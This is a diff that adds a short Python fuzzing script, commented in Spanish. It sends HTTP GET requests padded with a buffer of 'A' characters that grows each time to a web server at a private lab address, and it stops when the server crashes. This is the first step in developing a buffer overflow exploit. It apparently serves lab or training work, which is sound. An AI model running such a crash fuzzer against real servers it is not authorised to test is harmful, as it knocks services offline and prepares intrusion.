@@ -1,0 +1,27 @@
+#!usr/share/python
+# encoding: utf-8
+import socket, os, sys
+
+#Pruebas con parametro GET
+princi_buffer="GET "
+buffer =""
+fin_buffer= "HTTP/1.1\r\n\r\n"
+
+while True:
+	buffer = buffer +('A'*100)
+	final_buffer = princi_buffer+buffer+fin_buffer
+
+	print ("Lanzando buffer de %d caracteres " % len(buffer))
+
+	try:
+	    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	    sock.connect(("192.168.63.149", 80))
+
+	    sock.send(final_buffer)
+	    sock.recv(1024)
+	    sock.close()
+	    
+	    print ("Petición enviada a la app: %s" % final_buffer)
+	except:
+	    print ( "El servidor ha reventado con un buffer de %d caracteres" % len(buffer))
+	    exit()
